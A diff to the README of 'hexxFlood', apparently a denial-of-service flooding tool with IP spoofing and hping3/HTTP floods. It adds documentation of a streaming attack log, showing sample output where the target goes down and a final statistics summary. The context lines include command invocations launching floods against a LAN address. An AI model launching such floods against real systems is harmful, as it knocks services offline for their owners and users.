@@ -29,7 +29,7 @@
 - ✅ **Configurable Threads** (1-200)
 - ✅ **Custom Port Selection**
 - ✅ **IP Spoofing**
-- ✅ **Real-time Monitoring** (live in-place value updates — no screen flicker)
+- ✅ **Real-time Monitoring** — streaming attack log (whole run scrolls) + optional live `monitor.sh` dashboard
 - ✅ **Automatic Cleanup**
 - ✅ **Configuration Persistence**
 - ✅ **System Optimization**
@@ -131,6 +131,46 @@ sudo ./hexxFlood.sh -u http://192.168.1.14 -T http -p 100
 # All attack types, extreme mode
 sudo ./hexxFlood.sh -t 192.168.1.14 -T all -m extreme
 ```
+
+### Live attack output (streaming log)
+
+While an attack runs, `hexxFlood.sh` prints a **scrolling status log** — a header once,
+then one compact line per interval so the **whole run scrolls by** (nothing is cleared):
+
+```text
+────────────────────────────────────────────────────────────────
+[18:31:01] t 12s  rem 48s  pkts 10,806  pps 900  bw 4Mbps  resp time=1.24 ms  cpu 41% mem 4.2Gi/23Gi  proc h:12 w:0
+[18:31:03] t 14s  rem 46s  pkts 12,606  pps 900  bw 4Mbps  resp time=1.31 ms  cpu 43% mem 4.2Gi/23Gi  proc h:12 w:0
+[18:31:05] t 16s  rem 44s  pkts 14,400  pps 900  bw 4Mbps  resp DOWN            cpu 45% mem 4.2Gi/23Gi  proc h:12 w:0
+```
+
+Each line reports the timestamp, elapsed / remaining time, total packets, packets-per-second,
+estimated bandwidth, target ping response (or `DOWN`), CPU/memory, and live attack-process counts.
+
+Press **`Ctrl+C`** (or let `-D` elapse) to stop — the terminal is restored cleanly and a
+structured **final summary** (total packets, total time, average PPS) is printed at the end,
+with rules that adapt to your terminal width so it stays tidy on small screens:
+
+```text
+════════════════════════════════════════════════════════════════
+   🛑  hexxFlood — Attack Stopped
+════════════════════════════════════════════════════════════════
+
+   ✔  hping3 flood processes terminated
+   ✔  HTTP flood terminated
+   ✔  Temporary files removed
+
+   📊 Final Statistics
+      Total Packets Sent : 32,418
+      Total Time         : 36s
+      Average PPS        : 900
+────────────────────────────────────────────────────────────────
+   ✅ Cleanup complete.  Stay ethical. 👋
+────────────────────────────────────────────────────────────────
+```
+
+> For a richer, real-time **dashboard** view (throughput graphs, system panel), run the
+> dedicated `monitor.sh` in a second pane — see [Monitoring the Attack](#-monitoring-the-attack-live-demo) below.
 
 ### Quick Launcher (`quick.sh`)
 
